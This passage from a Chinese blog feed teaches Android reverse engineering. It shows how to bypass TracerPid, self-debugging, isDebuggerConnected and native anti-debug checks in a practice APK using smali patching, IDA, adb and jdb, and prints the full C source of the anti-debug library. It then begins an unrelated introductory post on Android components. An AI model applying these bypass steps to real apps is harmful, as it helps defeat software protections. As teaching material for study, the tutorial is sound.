alt="image-20211015165909246"></p><p>它对应我们的<code>debugger</code>程序</p><p>所以</p><p><strong>当我们用<code>debugger</code>调试某个进程的时候，<code>TracerPid</code>会变成调试器的Pid</strong></p><p>运行<code>self-debugging</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252040.png" alt="image-20211015170303811"></p><p>主进程Pid：9842</p><p>子进程Pid：9843</p><p>子进程调用父进程</p><p>之前有提及到过</p><p><strong>同一时刻，我们调试的时候，一个进程只能被一个进程附加</strong></p><p>所以</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252041.png" alt="image-20211015170600047"></p><h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>综上所述：过掉self-debugger直接附加他的子进程即可绕过</p><h2 id="六、Java层反调试"><a href="#六、Java层反调试" class="headerlink" title="六、Java层反调试"></a>六、Java层反调试</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">JDWP协议动态调式安卓程序动态调式条件:1.在AndroidMainfest.xml中,application标签下Android:debuggable=true2.系统默认调式，在build.prop(boot.img),ro.debugable=1Android SDK中有android.os.debug类提供了一个isDebuggerConnected方法，用于判断JDWP调式器是否正在工作两个满足之一即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>jadx打开案例apk</p><p>我们先看<code>AndroidMainfest.xml</code>文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252042.png" alt="image-20211015172152904"></p><p>然后去看<code>StubApplication</code>下的<code>onCreate()</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252043.png" alt="image-20211015172321129"></p><p>我们关注<code>isDebuggerConnected</code>方法</p><p>因为它是：<strong>用于判断JDWP调式器是否正在工作</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252044.png" alt="image-20211015172459840"></p><p><code>Debug.isDebuggerConnected</code>获取到一个值进行比较</p><p>如果为真就进行加载<code>loadLibrary</code>库</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252045.png" alt="image-20211015172614033"></p><p>继续往上看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252046.png" alt="image-20211015172806381"></p><p>所以只有符合条件成立才会执行if里面的逻辑，进行加载so库</p><p><strong>这就是在java层进行反调试，也能用来保护代码</strong></p><h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>进行Androidkiller 反编译</p><p>这个APK是加壳的 这里不是我们的重点 先跳过</p><p>我们今天是要熟悉该APK 中Java层 反调试的逻辑</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252047.png" alt="image-20211015173150170"></p><p>我们直接工程搜索<code>isDebuggerConnected</code>方法</p><p>我们就找到了这个 方法的Smali代码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252048.png" alt="image-20211015173506188"></p><p>代码分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252049.png" alt="image-20211015173651530"></p><p>这里是 判断</p><p>然后<code>v0</code> 返回给<code>cond_0</code></p><p>那么我们取反</p><p>nez 改成 eqz即可</p><h2 id="七、实战案例分析"><a href="#七、实战案例分析" class="headerlink" title="七、实战案例分析"></a>七、实战案例分析</h2><p>拿到一个apk，我们一个简单的思路</p><p>第一步：先去查壳</p><p>第二步：APK反编译查看有没有签名</p><p>第三步：逆向分析逻辑</p><h3 id="AntiDebug-apk-静态分析"><a href="#AntiDebug-apk-静态分析" class="headerlink" title="AntiDebug.apk-静态分析"></a>AntiDebug.apk-静态分析</h3><p>jadx反编译AntiDebug.apk</p><p>找onCreate()</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252050.png" alt="image-20211015175536296"></p><p>开始分析</p><p><code>loadLibrary</code>直接加载了<code>antidebug</code>，那么说明逻辑在so库里面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252051.png" alt="image-20211015175722505"></p><p>上IDA 分析</p><p>把AntiDebug.apk用解压软件打开 找到so库文件 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252052.png" alt="image-20211015175905937"></p><p>拖入IDA 即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252053.png" alt="image-20211015175940672"></p><p>找静态注册的动态函数：JNI_Onload</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252054.png" alt="image-20211015180059251"></p><p>TAB伪代码进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252055.png" alt="image-20211015180140937"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252056.png" alt="image-20211015180154756"></p><p>右键 进行隐藏类型 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252057.png" alt="image-20211015180401231"></p><p>然后进行代码分析</p><p>两个赋值</p><p>然后是if判断</p><p>if判断中用了<code>或运算符</code></p><p>后面四个参数 有一个 达成条件既满足if判断</p><p>需要将这四个函数 都为假 才能绕过</p><h4 id="anti-time"><a href="#anti-time" class="headerlink" title="anti_time()"></a>anti_time()</h4><p>先查看<code>anti_time()</code>参数 双击进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252058.png" alt="image-20211015180715253"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252059.png" alt="image-20211015180745160"></p><p>代码分析</p><p>1.首先定义结构体类型</p><p>2.定义v0=getpid</p><p>3.然后调用了同一个函数gettimefday传入两个不同的值</p><p>4.<code>v1 = tv.tv_sec - v3.tv_sec;</code>通过传入两个不同的参数调用<code>tv_sec</code>做差值获取到v1</p><p>5.如果if判断，v1小于等于1返回0，否者就kill，这就是一个简单的时间检测</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252060.png" alt="image-20211015181216322"></p><h4 id="anti-breakpoint"><a href="#anti-breakpoint" class="headerlink" title="anti_breakpoint"></a>anti_breakpoint</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252062.png" alt="image-20211015181428762"></p><p>双击进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252063.png" alt="image-20211015181503472"></p><p>我们关注 return 返回值</p><p>想要返回值不触发，只需要这里面函数的返回值都为0即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252064.png" alt="image-20211015200101336"></p><p>这里很多if和while嵌套循环，那么最终不执行return 1，可以在多个if中进行修改条件即可</p><h4 id="anti-pthread"><a href="#anti-pthread" class="headerlink" title="anti_pthread()"></a>anti_pthread()</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252065.png" alt="image-20211015200130765"></p><p>双击进来</p><p>分析代码</p><p>1.pthread_self创建子线程</p><p>2.<code>pipe(&amp;pipefd)</code>是管道意思是实现进程通信</p><p>3.pthread_create创建线程，传入了四个参数</p><p>查看第三个参数: anti_thread</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252066.png" alt="image-20211015200448188"></p><p>if判断 然后return 0</p><p>这是一个获取线程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252067.png" alt="image-20211015200620213"></p><p>registerNativeMethod是一个无关的参数</p><h3 id="AntiDebug-apk-动态分析"><a href="#AntiDebug-apk-动态分析" class="headerlink" title="AntiDebug.apk-动态分析"></a>AntiDebug.apk-动态分析</h3><p>获取主类</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252068.png" alt="image-20211015201008945"></p><pre class="line-numbers language-none"><code class="language-none">com.qianyu.antidebug/.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传安装apk</p><pre class="line-numbers language-none"><code class="language-none">adb install C:\Users\12550\Desktop\AntiDebug.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252069.png" alt="image-20211015201240431"></p><p>挂起apk程序</p><pre class="line-numbers language-none"><code class="language-none">adb shell am start -D -n com.qianyu.antidebug/.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252070.png" alt="image-20211015201314823"></p><p>打开ddms</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252071.png" alt="image-20211015201401254"></p><p>启动<code>android_server</code></p><p>注：我更名且指定了端口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252072.png" alt="image-20211015201546487"></p><p>端口转发</p><pre class="line-numbers language-none"><code class="language-none">adb forward tcp:7788 tcp:7788<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252073.png" alt="image-20211015201741921"></p><p>IDA 连接</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252074.png" alt="image-20211015201820665"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252075.png" alt="image-20211015201846064"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252076.png" alt="image-20211015201923358"></p><p>增加设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252077.png" alt="image-20211015202035609"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252078.png" alt="image-20211015202057651"></p><p>F9 进入运行状态</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252079.png" alt="image-20211015202219775"></p><pre class="line-numbers language-none"><code class="language-none">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8600<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252080.png" alt="image-20211015202343671"></p><p>IDA 运行一下 加载so库</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252081.png" alt="image-20211015231232628"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252083.png" alt="image-20211015231315739"></p><p>找到<code>JNI_OnLoad</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252084.png" alt="image-20211015230157761"></p><p>双击进入</p><p>下断点</p><p>F9 运行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252085.png" alt="image-20211015232446516"></p><p>F7单步步入</p><p>可以看到状态寄存器 T=1</p><p>说明这里面是Thumb模式指令</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252086.png" alt="image-20211015232605850"></p><p>0 2 4 6 8 A</p><p>两位数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252087.png" alt="image-20211015232721274"></p><h3 id="动静结合"><a href="#动静结合" class="headerlink" title="动静结合"></a>动静结合</h3><p>F8 跳下来 </p><p>注意R*3</p><p>R*3是GetEnv</p><p><img src="https://img-blog.csdnimg.cn/9d3bd1b0617242c6b8aba222f12bc407.png" alt="在这里插入图片描述"></p><p>注：这里实在截图不方便 ，手机拍照 师傅们见谅</p><p>如果Enν获取成功的话就会执行后面的三个函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252088.png" alt="image-20211015233743564"></p><p>这三个函数会在这里进行反调试，如何跳过不执行呢？</p><p>同步PC寄存器</p><p>选中上面第一个函数</p><p>然后 下面栈 右键</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252089.png" alt="image-20211015234051422"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252090.png" alt="image-20211015234313376"></p><p>F2 开始进行修改 为00</p><p>最后F2保存</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252091.png" alt="image-20211015234433281"></p><p>把后面两个参数 的栈地址 一样的方法 进行修改为00</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252092.png" alt="image-20211015234534196"></p><p>前三个 参数 就没有了 看第四个参数</p><p>双击进入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252093.png" alt="image-20211015234651609"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252094.png" alt="image-20211015234721723"></p><p>静态代码 也双击 进入 第四个参数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252095.png" alt="image-20211015234759009"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252096.png" alt="image-20211015234812080"></p><p>R5 有四个 参数 </p><p>只需要看第三个 参数 即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252097.png" alt="image-20211015234900460"></p><p>F4 跳到R5</p><p>然看第三个 参数R2 </p><p>点击箭头 进入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252098.png" alt="image-20211015235200428"></p><p>识别成功后 地址什么 都没有</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252099.png" alt="image-20211015235329024"></p><h3 id="分析函数源码"><a href="#分析函数源码" class="headerlink" title="分析函数源码"></a>分析函数源码</h3><p>这里 直接给师傅们 贴出来</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;jni.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/inotify.h&gt;#include &lt;elf.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;android/log.h&gt;#define LOG_TAG "qianyu"#define LOGV(...) __android_log_print(ANDROID_LOG_VERBOSE, LOG_TAG, __VA_ARGS__)#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN  , LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , LOG_TAG, __VA_ARGS__)#define MAX 1024//检测代码执行时间差jint anti_time(){ int pid = getpid(); struct timeval t1; struct timeval t2; struct timezone tz; gettimeofday(&amp;t1, &amp;tz); gettimeofday(&amp;t2, &amp;tz); int timeoff = (t2.tv_sec) - (t1.tv_sec); LOGD("time %d",timeoff); if (timeoff &gt; 1) {int ret = kill(pid, SIGKILL);return 1; }return 0;}//inotify检测jint anti_inotify(){const int MAXLEN = 2048;int ppid =getpid();char buf[1024],readbuf[MAXLEN];int pid, wd, ret,len,i;int fd;fd_set readfds;//防止调试子进程ptrace(PTRACE_TRACEME, 0, 0, 0);fd =  inotify_init();sprintf(buf, "/proc/%d/maps",ppid);wd = inotify_add_watch(fd, buf, IN_ALL_EVENTS);if (wd &lt; 0) {LOGD("can't watch %s",buf);    return 0;}while (1) {i = 0;    //注意要对fd_set进行初始化    FD_ZERO(&amp;readfds);    FD_SET(fd, &amp;readfds);    //第一个参数固定要+1，第二个参数是读的fdset，第三个是写的fdset，最后一个是等待的时间    //最后一个为NULL则为阻塞    //select系统调用是用来让我们的程序监视多个文件句柄的状态变化    ret = select(fd + 1, &amp;readfds, 0, 0, 0);    if (ret == -1)    break;    if (ret) {        len = read(fd,readbuf,MAXLEN);        while(i &lt; len){        //返回的buf中可能存了多个inotify_event        struct inotify_event *event = (struct inotify_event*)&amp;readbuf[i];        LOGD("event mask %d\n",(event-&gt;mask&amp;IN_ACCESS) || (event-&gt;mask&amp;IN_OPEN));//这里监控读和打开事件if((event-&gt;mask&amp;IN_ACCESS) || (event-&gt;mask&amp;IN_OPEN)){LOGD("kill!!!!!\n");//事件出现则杀死父进程int ret = kill(ppid,SIGKILL);LOGD("ret = %d",ret);return 1;}i+=sizeof (struct inotify_event) + event-&gt;len;        }    }}inotify_rm_watch(fd,wd);close(fd);return 0;}/* * 检测在调试状态下的软件断点（断点扫描） * 读取其周围的偏移地址有没有ARM等指令集的断点指令 * 遍历so中可执行segment，查找是否出现breakpoint指令即可 * */unsigned long GetLibAddr() {    unsigned long ret = 0;    char name[] = "libantidebug.so";    char buf[4096], *temp;    int pid;    FILE *fp;    pid = getpid();    sprintf(buf, "/proc/%d/maps", pid);    fp = fopen(buf, "r");    if (fp == NULL) {        puts("open failed");        goto _error;    }    while (fgets(buf, sizeof(buf), fp)) {        if (strstr(buf, name)) {            temp = strtok(buf, "-");//将buf由"-"参数分割成片段            ret = strtoul(temp, NULL, 16);//将字符串转换成unsigned long(无符号长整型数)            break;        }    }    _error: fclose(fp);    return ret;}jint anti_breakpoint(){Elf32_Ehdr *elfhdr;Elf32_Phdr *pht;unsigned int size, base, offset,phtable;int n, i,j;char *p;//从maps中读取elf文件在内存中的起始地址base = GetLibAddr();if(base == 0){LOGD("find base error/n");    return 0;}elfhdr = (Elf32_Ehdr *) base;phtable = elfhdr-&gt;e_phoff + base;for(i=0;i&lt;elfhdr-&gt;e_phnum;i++){pht = (Elf32_Phdr*)(phtable+i*sizeof(Elf32_Phdr));    if(pht-&gt;p_flags&amp;1){    offset = pht-&gt;p_vaddr + base + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr)*elfhdr-&gt;e_phnum;        LOGD("offset:%#x ,len:%#x",offset,pht-&gt;p_memsz);        p = (char*)offset;        size = pht-&gt;p_memsz;        for(j=0,n=0;j&lt;size;++j,++p){        if(*p == 0x10 &amp;&amp; *(p+1) == 0xde){        n++;                LOGD("### find thumb bpt %#x /n",p);                return 1;        }else if(*p == 0xf0 &amp;&amp; *(p+1) == 0xf7 &amp;&amp; *(p+2) == 0x00 &amp;&amp; *(p+3) == 0xa0){                n++;                LOGD("### find thumb2 bpt %#x /n",p);                return 1;            }else if(*p == 0x01 &amp;&amp; *(p+1) == 0x00 &amp;&amp; *(p+2) == 0x9f &amp;&amp; *(p+3) == 0xef){                n++;                LOGD("### find arm bpt %#x /n",p);                return 1;            }        }        LOGD("### find breakpoint num: %d/n",n);    }}return 0;}//多进程/线程int pipefd[2];int childpid;int isAnti=0;void *anti_thread(void*){int statue=-1,alive=1,conut=0;close(pipefd[1]);while(read(pipefd[0],&amp;statue,4)&gt;0)break;sleep(1);//这里改为非阻塞fcntl(pipefd[0],F_SETFL,O_NONBLOCK);LOGI("pip--&gt;read=%d",statue);while(true){LOGI("pip--&gt;read=%d",statue);read(pipefd[0],&amp;statue,4);sleep(1);LOGI("pip--&gt;read=%d",statue);if(statue!=0){if(isAnti==0)return NULL;kill(childpid,SIGKILL);kill(getpid(),SIGKILL);return NULL;}statue=-1;isAnti=1;}}void anti(){int pid,p;FILE *fd;char filename[MAX];char line[MAX];pid=getpid();//读取/proc/pid/status中的tracerPidsprintf(filename,"/proc/%d/status",pid);p=fork();if(p==0){LOGI("child");//关闭子进程的读管道close(pipefd[0]);int pt,alive=0;//子进程反调试pt=ptrace(PTRACE_TRACEME,0,0,0);while(true){fd=fopen(filename,"r");while(fgets(line,MAX,fd)){if(strstr(line,"TracerPid")!=NULL){LOGI("line %s",line);int statue=atoi(&amp;line[10]);LOGI("tracer pid:%d",statue);write(pipefd[1],&amp;statue,4);fclose(fd);if(statue!=0){LOGI("tracer pid:%d",statue);return;}break;}}sleep(1);}}else{LOGI("father");childpid=p;}}jint anti_pthread(){// id_0：新线程标识符pthread_t id_0;id_0=pthread_self();pipe(pipefd);pthread_create(&amp;id_0,NULL,anti_thread,(void*)NULL);LOGI("start");anti();return 0;}JNINativeMethod nativeMethod[]={};jint registerNativeMethod(JNIEnv* env){jclass clszz=env-&gt;FindClass("com/qianyu/antidebug/MainActivity");if(env-&gt;RegisterNatives(clszz,nativeMethod,sizeof(nativeMethod)/sizeof(nativeMethod[0]))!=JNI_OK){return JNI_ERR;}return JNI_OK;}JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){JNIEnv* env;if(vm-&gt;GetEnv((void**)&amp;env,JNI_VERSION_1_4)!=JNI_OK){return JNI_ERR;}anti_time();anti_breakpoint();anti_pthread();if(registerNativeMethod(env)!=JNI_OK){return JNI_ERR;}return JNI_VERSION_1_4;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>.C</code>文件在JNI_Onload中充当main入口函数</p><p>因为在java层要使用 loadLibrary加载So库</p><p>loadLibrary会遍历so库里面是否有JNI_Onload执行sO库</p><p>如果没有就不会执行so库</p><p>所以分析的C文件是要从JNI_Onload开始分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252100.png" alt="image-20211016121816868"></p><p>因为<code>JNINativeMethod nativeMethod[]={};</code>为空 所以就过掉了反调试</p><p><strong>最后请大家谨记网络安全法，遵纪守法，不要擅自做违法的事情，后果自负</strong></p><p>希望此文对师傅们有帮助！</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(九) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(二)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-er/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-er/</url>
      
        <content type="html"><![CDATA[<p>这是第二篇</p><p>我们继续</p><h1 id="四大组件的理解"><a href="#四大组件的理解" class="headerlink" title="四大组件的理解"></a>四大组件的理解</h1><p>用<code>AndroidKiller.exe</code>打开土豆的apk</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115843.png" alt="image-20210720115843"></p><pre class="line-numbers language-none"><code class="language-none">1．Activity(活动)：用于表现功能2．Service(服务)：后台运行服务，不提供界面呈现3．Broadcast receiver(广播接收者)：用于接收广播4．Content provider(内容提供者)：支持多个应用中存储和读取数据，相当于数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、Activity-活动"><a href="#一、Activity-活动" class="headerlink" title="一、Activity(活动)"></a>一、Activity(活动)</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><h4 id="1、声明"><a href="#1、声明" class="headerlink" title="1、声明"></a>1、声明</h4><p>Activity是一个界面，一个APP是由很多Activity进行界面调用的</p><p>想要使用Activity需要在<code>AndroidManifest.xml</code>中声明，只要调用的就需要声明</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115844.png" alt="image-20210717015032751"></p><h4 id="2、继承Activity"><a href="#2、继承Activity" class="headerlink" title="2、继承Activity"></a>2、继承Activity</h4><p>然后接着上一节课 使用eclipse</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115845.png" alt="image-20210717011418033"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115846.png" alt="image-20210717011443530"></p><p>进行打开</p><p>创建安卓项目</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115847.png" alt="image-20210717011521016"></p><p>项目名</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115848.png" alt="image-20210717012151363"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115849.png" alt="image-20210717012203269"></p><p>这里是选初始图标</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115850.png" alt="image-20210717012305175"></p><p>有没有很熟悉 就是安卓学习(一)中的改图标实操</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115851.png" alt="image-20210717012337992"></p><p>一路默认过去</p><p>创建完成之后 主函数 在这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115852.png" alt="image-20210717012717823"></p><p>这里有一个要注意的点：</p><p><strong>无论是做什么，都需要在应用程序的<code>AndroidManifest.xml</code>必须要声明所有的组建</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115853.png" alt="image-20210717012843521"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115854.png" alt="image-20210717012859383"></p><pre class="line-numbers language-none"><code class="language-none">public class MainActivity extends Activity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继承Activity才能被识别为一个活动界面MainActivity</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115855.png" alt="image-20210717015214687"></p><p>进行设计我们的界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115856.png" alt="image-20210717013201967"></p><p>这里有很多 可以自己玩一玩</p><p>将我们设计的进行导出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115857.png" alt="image-20210717013508106"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115858.png" alt="image-20210717013521711"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115859.png" alt="image-20210717013603200"></p><p>我们本地的模拟器 会出现在这里进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115900.png" alt="image-20210717014334180"></p><p>进行导入别人的项目包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115901.png" alt="image-20210717194031278"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115902.png" alt="image-20210717194108789"></p><p>进行选择目录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115903.png" alt="image-20210717194133616"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115904.png" alt="image-20210717194209274"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115905.png" alt="image-20210717194253844"></p><h3 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h3><h4 id="1、onCreat"><a href="#1、onCreat" class="headerlink" title="1、onCreat()"></a>1、<code>onCreat()</code></h4><p>这个方法在活动第一次被创建的时候调用。在这个方法中完成活动的初始化操作，比如说加载布局、绑定事件等</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115906.png" alt="image-20210717020208204"></p><h4 id="2-onStart"><a href="#2-onStart" class="headerlink" title="2.onStart()"></a>2.<code>onStart()</code></h4><p>这个方法在活动由不可见变为可见的时侯进行调用!!界面呈现出来了!</p><h4 id="3-onResume"><a href="#3-onResume" class="headerlink" title="3.`onResume()"></a>3.`onResume()</h4><p>这个方法在活动准备好和用户进行交互的时侯进行调用。此时的活动一定位于返回栈的栈顶，并且处于运行状态。</p><p><strong>运行的结果 就是展示内容</strong></p><h3 id="销毁过程"><a href="#销毁过程" class="headerlink" title="销毁过程"></a>销毁过程</h3><h4 id="1、onPause"><a href="#1、onPause" class="headerlink" title="1、onPause()"></a>1、onPause()</h4><p>这个方法在系统准备去启动或者恢复另一个活动的时候调用。我们通常会在这个方法中将一些消耗CPU的资源释放掉，以及保存一些关键数据，但这个方法的执行速度定要快，不然会影响到新的栈顶活动的使用。</p><p>白化：手机向上一滑回到桌面 应用进行最小化 放在后台运行 那么 在向上一滑可以选择执行应用</p><h4 id="2、onStop"><a href="#2、onStop" class="headerlink" title="2、onStop()"></a>2、onStop()</h4><p>这个方法在活动完全不可见的时侯调用。它和onPause()方法的主要区别在于，如果启动的新活动是一个对话框式的活动，那么onPause()方法会得到执行，而nonStop()方法并不会执行。</p><h4 id="3、onDestroy"><a href="#3、onDestroy" class="headerlink" 